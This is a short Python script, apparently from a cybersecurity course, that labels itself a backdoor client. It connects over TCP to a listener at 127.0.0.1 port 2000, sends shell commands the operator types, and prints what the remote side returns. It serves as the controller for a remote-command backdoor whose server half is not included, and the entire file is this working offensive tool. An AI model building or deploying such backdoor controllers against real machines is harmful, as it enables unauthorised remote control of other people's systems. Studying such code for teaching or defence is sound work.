"""
Uso: Backdoor Cliente
Creador: Andrés Hernández Mata
Version: 3.0.0
Python: 3.9.1
Fecha: 08 Abril 2020
"""

import socket
import sys
import os
from colorama import Fore
from colorama import Style
import pyfiglet as header
from termcolor import colored

os.system("cls")

servidor = ("127.0.0.1", 2000)
bufferSize = 1024

banner = header.figlet_format(" CLIENTE").upper()
print(colored(banner.rstrip("\n"), 'red', attrs=['bold']))
print(colored("ANDRES HERNANDEZ MATA | CIBERSEGURIDAD | LSTI\n", 'yellow', attrs=['bold']))

try:
    TCPClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPClientSocket.connect(servidor)
    print("[+] Estableciendo Conexión...")
    while True:
        print("[+] Ingresar Comando...")
        comando = input("> ")
        if comando == "exit":
            comando = comando.encode()
            TCPClientSocket.send(comando)
            TCPClientSocket.close()
            print("[+] Cerrando Conexion...")    
            print("[+] Saliendo...")
            print("[-] Bye...")
            sys.exit()
        else:
            os.system("cls")
            print("[+] Enviando Comando...")
            comando = comando.encode()
            TCPClientSocket.send(comando)
            print("[+] Espere...")
            salida = TCPClientSocket.recv(bufferSize).decode()                                
            print("[+] Salida...")
            print(salida)
except Exception:    
    print(Fore.RED + "Ocurrio una excepción en la conexion del servidor" + Style.RESET_ALL)


